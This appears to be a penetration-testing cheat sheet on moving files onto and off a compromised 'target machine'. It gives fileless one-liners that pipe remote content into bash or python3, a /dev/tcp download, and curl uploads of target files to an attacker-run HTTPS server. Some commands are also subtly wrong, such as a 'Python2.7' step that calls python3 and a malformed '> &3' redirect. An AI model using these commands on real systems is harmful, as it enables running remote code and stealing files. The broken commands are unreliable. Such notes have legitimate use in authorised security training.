## Download Operations
#### 1) Base64 Encoding / Decoding
1. **Personal Machine - Check File MD5 hash**
	- `md5sum [filename]`
2. **Personal Machine - Encode File Content to Base64**
	- `cat [filename] | base64 -w 0; echo`
3. **Target Machine - Decode the File**
	- `echo -n 'encoded file content' | base64 -d > [new file]`
4. **Target Machine - Check File MD5 hash**
	- `md5sum [local file]`
****
#### 2) Web Downloads with Wget and cURL
1. **Download a File Using Wget or cURL**
	- `wget [file link] -O [new file name]`
	- `curl [file link] -o [new file name]`
****
#### 3) Fileless Attacks Using Linux
- **Fileless Download with cURL**
	- `curl [file link] | bash`
- **Fileless Download with Wget**
	- `wget -qO- [file link] | python3`
****
#### 4) Download with Bash (/dev/tcp)
1. **Connect to the Target Webserver**
	- `exec 3<>/dev/tcp/[webserver address]/80`
2. **HTTP GET Request**
	- `echo "GET /[file name or file path] HTTP/1.1\n\n" > &3`
3. **Print File Content**
	- `cat <&3`
****
#### 5) SSH Downloads
- **SCP** is a command line utility for remote file transfer that, by default, uses the SSH protocol
- **SCP** allows you to copy files and directories between two hosts securely
1. **Personal Machine - Enabling the SSH Server**
	- `sudo systemctl enable ssh`
2. **Personal Machine - Starting the SSH Server**
	- `sudo systemctl start ssh`
3. **Personal Machine - Checking for SSH Listening Port**
	- `netstat -lnpt`
4. **Target Machine - Download Files Using SCP**
	- `scp [sender username]@[sender ip address]:[file path] [local file location of the newly downloaded file]`
	- You can create a temporary user account for file transfers to avoid using your primary user account and credentials

## Upload Operations
#### 1) Web Upload
1. **Personal Machine - Start Web Server**
	- `sudo python3 -m uploadserver`
2. **Personal Machine - Create a Self-Signed Certificate**
	- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
3. **Personal Machine - Start Web Server**
	- The web server should not host the certificate so make a separate directory for hosting the web server
	- `mkdir https && cd https`
	- `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
4. **Target Machine - Upload Multiple Files**
	- `curl -X POST https://[personal machine ip address]/upload -F 'files=@/[file path]' --insecure`
	- You can use `-F [file to be uploaded]` multiple times for uploading multiple files
****
#### 2) Alternative Web File Transfer Method
1. **Target Machine - Creating a Web Server** 
	1. **With Python3**
		- `python3 -m http.server`
	2. **With Python2.7**
		- `python3 -m SimpleHTTPServer`
	3. **With PHP**
		- `php -S 0.0.0.0:8000`
	4. **With Ruby**
		- `ruby -run -ehttpd . -p8000`
2. **Personal Machine - Download the File from the Target Machine onto the Personal Machine**
	- `wget [target machine ip address]:8000/[file path]`
****
#### 3) SCP Upload
1. **File Upload using SCP**
	- `scp [path of the file to be uploaded] [personal machine username]@[personal machine ip address]:/[path of where to upload]`
